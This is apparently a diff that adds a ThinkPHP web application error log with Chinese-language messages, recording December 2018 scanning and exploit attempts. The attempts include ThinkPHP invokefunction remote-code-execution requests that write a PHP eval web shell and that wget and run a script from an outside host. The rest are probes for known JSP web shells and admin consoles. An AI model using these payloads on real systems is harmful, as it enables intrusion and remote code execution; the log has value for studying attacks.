@@ -1,0 +1,78 @@
+[ 2018-12-21T00:19:37+08:00 ] 66.42.114.203 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3c%3fphp%20echo%20PHP_SAPI%3b%40eval(%5c%24_POST%5b%27q1n9nbst%27%5d)%3b%3f%3e%22%3eindex1.php
+ERR: 非法操作:\think\app
+
+[ 2018-12-21T13:43:59+08:00 ] 80.211.89.146 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=busybox%20wget%20http://80.211.89.146/z.sh;%20chmod%20+x%20z.sh;%20sh%20z.sh%20
+ERR: 非法操作:\think\app
+
+[ 2018-12-21T14:36:42+08:00 ] 71.6.202.198 /ccvv
+ERR: 无法加载控制器:Ccvv
+
+[ 2018-12-21T16:57:24+08:00 ] 62.97.116.68 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2018-12-21T20:17:03+08:00 ] 132.232.73.127 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2018-12-21T20:50:51+08:00 ] 132.232.73.127 /jexsw2/jexsw2.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexsw2
+
+[ 2018-12-21T20:50:52+08:00 ] 132.232.73.127 /jexws2/jexws2.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexws2
+
+[ 2018-12-21T20:50:55+08:00 ] 132.232.73.127 /jexws3/jexws3.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexws3
+
+[ 2018-12-21T20:51:07+08:00 ] 132.232.73.127 /jexws4/jexws4.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexws4
+
+[ 2018-12-21T20:51:18+08:00 ] 132.232.73.127 /jexinv/jexinv.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexinv
+
+[ 2018-12-21T20:51:30+08:00 ] 132.232.73.127 /jexinv3/jexinv3.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexinv3
+
+[ 2018-12-21T20:51:42+08:00 ] 132.232.73.127 /jexinv4/jexinv4.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jexinv4
+
+[ 2018-12-21T20:51:54+08:00 ] 132.232.73.127 /jbossass/jbossass.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jbossass
+
+[ 2018-12-21T20:52:07+08:00 ] 132.232.73.127 /console/jspzxc.jsp?cmd=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Console
+
+[ 2018-12-21T20:52:12+08:00 ] 132.232.73.127 /demo/404.jsp?bjh=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Demo
+
+[ 2018-12-21T20:52:13+08:00 ] 132.232.73.127 /dread/lock.jsp?tezaz=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Dread
+
+[ 2018-12-21T20:52:17+08:00 ] 132.232.73.127 /HCEGH/xunfeng.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:HCEGH
+
+[ 2018-12-21T20:52:18+08:00 ] 132.232.73.127 /jbws/jbws.jsp?eval=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Jbws
+
+[ 2018-12-21T20:52:22+08:00 ] 132.232.73.127 /shellinvoker/shellinvoker.jsp?ppp=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Shellinvoker
+
+[ 2018-12-21T20:52:26+08:00 ] 132.232.73.127 /zecmd/zecmd.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Zecmd
+
+[ 2018-12-21T20:52:46+08:00 ] 132.232.73.127 /iesvc/iesvc.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Iesvc
+
+[ 2018-12-21T20:53:02+08:00 ] 132.232.73.127 /idssvc/idssvc.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Idssvc
+
+[ 2018-12-21T20:53:15+08:00 ] 132.232.73.127 /wstats/wstats.jsp?comment=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:Wstats
+
+[ 2018-12-21T20:53:28+08:00 ] 132.232.73.127 /a/pwn.jsp?cmd=echo%20Hello%20D3c3mb3r
+ERR: 无法加载控制器:A
+
+[ 2018-12-21T20:58:58+08:00 ] 132.232.73.127 /ws/v1/cluster/apps/new-application
+ERR: 无法加载控制器:Ws
+
+[ 2018-12-21T20:58:58+08:00 ] 132.232.73.127 /manager/html
+ERR: 无法加载控制器:Manager
+
